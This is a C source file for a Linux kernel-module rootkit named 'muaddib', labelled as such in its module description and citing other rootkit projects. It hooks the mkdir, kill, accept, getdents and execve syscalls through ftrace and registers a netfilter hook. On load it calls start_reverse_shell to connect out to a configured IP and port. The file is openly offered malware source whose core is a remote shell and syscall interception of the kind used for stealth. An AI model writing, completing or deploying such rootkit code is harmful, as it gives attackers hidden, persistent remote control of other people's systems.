//https://xcellerator.github.io/posts/linux_rootkits_11/
//https://github.com/m0nad/Diamorphine
//https://github.com/h3xduck/Umbra
//https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
#include "ftrace_hook.h"
#include "mkdir_hook.c"
#include "kill_hook.c"
#include "accept_hook.c"
#include "getdents_hook.c"
#include "execve_hook.c"

static struct ftrace_hook hooks[] = {
	HOOK("sys_mkdir",  muaddib_mkdir,  &og_mkdir),
	HOOK("sys_kill", muaddib_kill, &og_kill),
    HOOK("sys_accept", muaddib_accept, &og_accept),
	HOOK("sys_getdents64", muaddib_getdents64, &og_getdents64),
	HOOK("sys_getdents", muaddib_getdents, &og_getdents),
	HOOK("sys_execve", muaddib_execve, &og_execve),
};

static int __init muaddib_init(void){
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err){ return err; }
	err = register_netfilter_hook();
	if (err){ return err; }
	start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    return 0;
}

static void __exit muaddib_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	unregister_netfilter_hook();
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(muaddib_init);
module_exit(muaddib_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nerelod");
MODULE_DESCRIPTION("LKM rootkit");
